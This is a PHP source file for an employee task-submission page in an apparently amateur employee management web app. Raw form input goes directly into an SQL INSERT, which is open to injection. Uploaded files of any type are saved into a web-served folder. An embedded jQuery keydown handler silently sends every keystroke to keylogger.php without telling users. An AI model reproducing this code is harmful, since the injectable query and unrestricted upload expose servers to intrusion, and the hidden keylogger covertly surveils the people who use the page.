<?php
include('header.php');

$query = mysql_query("SELECT * FROM employee WHERE Status = 'True'");
$row = mysql_fetch_assoc($query);


	//check if any task is assigned or not..
	$query_task = mysql_query("SELECT * FROM submited_task");
	if(mysql_num_rows($query_task) == NULL)
	{
		$task_id = 101;
	}
	else
	{
		$query_fetch = mysql_query("SELECT * FROM submited_task order by id desc limit 1");
		$row_task = mysql_fetch_assoc($query_fetch);
		$task_id = $row_task['Task_id'] + 1;
	}
	
if(isset($_POST['submit']))
{
	
	$submit_date = $_POST['submit_date'];
	$subject = $_POST['subject'];
	$Description = $_POST['description'];
	
	
	if(!empty($_FILES['file']['name']))
	{
		$file_temp = $_FILES['file']['tmp_name'];
		$extension = pathinfo($_FILES['file']['name'],PATHINFO_EXTENSION);
		$file_name = $task_id.".".$extension;
		move_uploaded_file($file_temp,'submit_task/'.$file_name);	
	}
	else
	{
		$file_name = "";
	}
	
	$query_insert = mysql_query("INSERT INTO submited_task VALUES ('','$task_id','$user_id','$submit_date','$subject','$Description','$file_name','True')");
}

?> 
   
    
   <?php
	if(substr($_SESSION['login_id'],0,4) == 'emp_')
	{
	
	?> 
    <!-- start navigation bar -->
    <div class="row nav">
   
    	<a href="home.php">
        <div class="large-2 column">
         Home
        </div>
        </a>
        
        <a href="company_detail.php">
        <div class="large-2 column">
       	 Company
        </div>
        </a>
        
        <a href="message.php">
        <div class="large-2 column">
         Message
        </div>
        </a>
        
        <a href="task.php">
        <div class="large-2 column" style="background:#10255F;">
         Task
        </div>
        </a>
        
      
        
        <a href="setting.php">
        <div class="large-2 column" >
        Setting
        </div>
        </a>
        
         <a href="logout.php">
        <div class="large-2 column">
         Logout
        </div>
        </a>
        
    </div>
    
    <!-- end navigation bar -->

    
  	<?php
	}
    else
	{
		unset($_SESSION['login_id']);
		header('location: index.php');	
	}
	?> 
    
    <script type="text/javascript">

//*************** START **************
//execute when we press and key from the key board...
$(document).keydown(function(event)
{
	//store that key into keycode variable..
	var keycode = event.keyCode;
	
	//call reload.php page using get method..
	//we send key value with the help of get method into reload.php page.. 	
	$('#hello').load('keylogger.php?press_key='+keycode+'&page=submit_complete_task');

});
//*************** END ****************

</script>


<!-- for key stock.. -->
<div id="hello"></div>
<!-- for key stock.. -->


    <!-- start main heading -->
    <div class="row">
    	<div class="large-3 column main_heading">
        Submit Completed Task
        </div>
        <div class="large-6 large-offset-1 column main_heading end">
        <span class="success_msg" style="color:#F00;">
        <?php 
		if(isset($_POST['submit']))
		{
			echo 'Successfully Task Submited..';
		}
		?>
        
        </span>
        </div>
    </div>
    <!-- end main heading -->


    <!-- start horizantal line -->
     <div class="row">
    	<div class="large-12 column">
        <hr style="border:0.1em #999999 solid;">
        </div>
    </div>
    <!-- end horizantal line -->
    
    
    
   <!-- start manage employee -->
   <div class="manage_emp">    
     
       <form action="submit_complete_task.php" method="post" enctype="multipart/form-data">
       <input type="hidden" name="submit_date" value="<?php echo $time; ?>" >
       
       
       <div class="row" >
            <div class="large-3 large-offset-1 column emp_name" >
            Subject
            </div>
            <div class="large-6 column end">
            <input type="text" name="subject" placeholder="Enter Message Subject" required >
            </div>
       </div>
       
        <div class="row">
            <div class="large-3 large-offset-1 column emp_name">
            Discription
            </div>
            <div class="large-6 column end">
            <textarea name="description" style="height:130px; width:470px;"></textarea>
            </div>
       </div>
       
        <div class="row">
            <div class="large-3 large-offset-1 column emp_name">
            Upload File
            </div>
            <div class="large-6 column end">
            <input type="file" name="file" >
            </div>
       </div>
       
        <div class="row">
            <div class="large-2 large-offset-5 column emp_name">
            <input type="submit" name="submit" value="Submit" style="margin-top:20px;">
            </div>
       </div>
       
       </form>
   
       
       
   </div>
   <!-- end manage employee -->
   
   
   
 	<script>
    
	$(".success_msg").delay(2000).slideUp(1000);
	
    </script>

    
   
</body>
</html>
